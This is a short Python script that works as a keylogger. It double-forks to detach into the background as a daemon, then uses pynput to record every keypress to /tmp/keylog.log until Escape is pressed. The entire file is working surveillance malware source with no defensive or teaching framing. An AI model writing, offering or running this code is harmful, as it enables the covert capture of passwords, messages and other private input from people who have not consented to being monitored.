#!/usr/bin/python3

from pynput import keyboard
import sys
import os

try:
    if os.fork() > 0:
        # Parent exit
        raise SystemExit(0)
except OSError as e:
    raise RuntimeError(f'fork #1 failed: {e}')

os.chdir('/tmp')
os.umask(0)
os.setsid()

try:
    if os.fork() > 0:
        # Parent exit
        raise SystemExit(0)
except OSError as e:
    raise RuntimeError(f'fork #2 failed: {e}')


def keyPressed(key):
    if str(key) == 'Key.esc':
        sys.exit(0)
    else:
        with open('/tmp/keylog.log',  'a') as fileHandler:
            fileHandler.write(str(key))

with keyboard.Listener(on_press = keyPressed) as listener:
    listener.join()
    

